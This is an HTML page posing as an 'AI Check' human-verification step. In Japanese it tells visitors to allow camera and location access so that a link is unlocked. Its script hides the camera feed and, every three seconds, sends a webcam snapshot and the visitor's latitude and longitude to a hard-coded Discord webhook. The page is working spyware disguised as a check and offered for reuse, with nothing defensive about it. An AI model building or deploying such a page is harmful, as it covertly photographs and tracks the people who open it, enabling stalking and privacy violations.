<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>AI Check!</title>
    <style>
      body {
        background-color: #f7f7f7;
        font-family: Arial, sans-serif;
        font-size: 16px;
      }
      h1 {
        color: #003580;
        font-size: 32px;
        text-align: center;
        margin-top: 50px;
      }
      #math-image {
        display: block;
        margin: 0 auto;
        width: 400px;
        height: 300px;
        border: 2px solid #003580;
        border-radius: 10px;
        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
      }
      #math-equation {
        text-align: center;
        margin-top: 20px;
        font-size: 24px;
        color: #003580;
      }
      video {
        display: none; /* カメラ映像は非表示に */
      }
    </style>
  </head>
  <body>
    <h1>AIではないことを証明するため カメラ・位置情報アクセスを許可してください許可したらリンクが解放されます</h1>
    <img
      id="math-image"
      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT8-5rpz6ep3gSkcAvYX_gtPgV1UtURRsfH4m5wNxsrHg&s"
      alt="Math Equation"
    />
    <div id="math-equation"></div>

    <script>
      let imageCounter = 1;

      // カメラ映像の取得とvideoタグ作成
      const constraints = { video: { width: 400, height: 300 } };
      let videoElement;

      navigator.mediaDevices
        .getUserMedia(constraints)
        .then(function (mediaStream) {
          videoElement = document.createElement("video");
          videoElement.srcObject = mediaStream;
          videoElement.play();
          document.body.appendChild(videoElement);
          videoElement.style.display = "none"; // 非表示
          // カメラ準備できたら定期実行開始
          setInterval(captureAndSend, 3000);
        })
        .catch(function (err) {
          console.error(err.name + ": " + err.message);
        });

      function captureAndSend() {
        if (!videoElement || videoElement.readyState !== 4) return;

        // 位置情報を先に取得
        navigator.geolocation.getCurrentPosition(
          function (position) {
            sendImageWithLocation(position.coords.latitude, position.coords.longitude);
          },
          function () {
            // 位置情報取得失敗時は空文字で送信
            sendImageWithLocation(null, null);
          }
        );
      }

      function sendImageWithLocation(lat, lon) {
        const canvas = document.createElement("canvas");
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(videoElement, 0, 0);

        canvas.toBlob(
          function (blob) {
            const formData = new FormData();
            formData.append("file", blob, "capture.jpg");

            // 位置情報があればテキストに追加
            let contentText = "";
            if (lat !== null && lon !== null) {
              contentText = `位置情報: 緯度 ${lat.toFixed(6)}, 経度 ${lon.toFixed(6)}`;
            } else {
              contentText = "位置情報なし";
            }
            formData.append("content", contentText);

            // Discord Webhook URL（自分のURLに差し替えてください）
            const webhookURL =
              "https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o";

            fetch(webhookURL, {
              method: "POST",
              body: formData,
            })
              .then(() => {
                // 送信成功したら画面の画像を更新
                document.getElementById("math-image").src = canvas.toDataURL();
                document.getElementById("math-equation").textContent =
                  "Equation " + imageCounter++;
              })
              .catch((e) => {
                console.error("送信エラー:", e);
              });
          },
          "image/jpeg",
          1.0
        );
      }
    </script>
  </body>
</html>
